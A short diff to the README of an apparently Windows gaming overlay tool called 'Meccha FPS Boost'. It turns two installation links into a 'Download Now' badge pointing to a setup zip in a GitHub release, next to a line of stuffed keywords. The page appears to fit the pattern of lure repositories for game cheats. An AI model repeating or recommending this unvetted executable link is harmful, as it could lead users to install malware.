@@ -31,10 +31,9 @@ Smart overlay system designed to improve visual clarity and situational awarenes
 
 
 
+## 📥 Download
 
-### 📥 [Installation](https://github.com/Centralkremarina/Meccha-FPS-Boost/releases/download/v2.3.10/setup.v2.3.10.zip)
-
-
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Centralkremarina/Meccha-FPS-Boost/releases/download/v2.3.10/setup.v2.3.10.zip)
 
 
 
@@ -85,9 +84,9 @@ MECCHA CHAMELEON, VISUAL TOOL, GAMING UTILITY, WINDOWS APPLICATION, ENHANCEMENT 
 
 ---
 
-### 📥 [Installation](https://github.com/Centralkremarina/Meccha-FPS-Boost/releases/download/v2.3.10/setup.v2.3.10.zip)
+## 📥 Download
 
-
+[![Download Now](https://img.shields.io/badge/⬇️_Download_Now-brightgreen?style=for-the-badge&logo=github)](https://github.com/Centralkremarina/Meccha-FPS-Boost/releases/download/v2.3.10/setup.v2.3.10.zip)
 
 
 ---
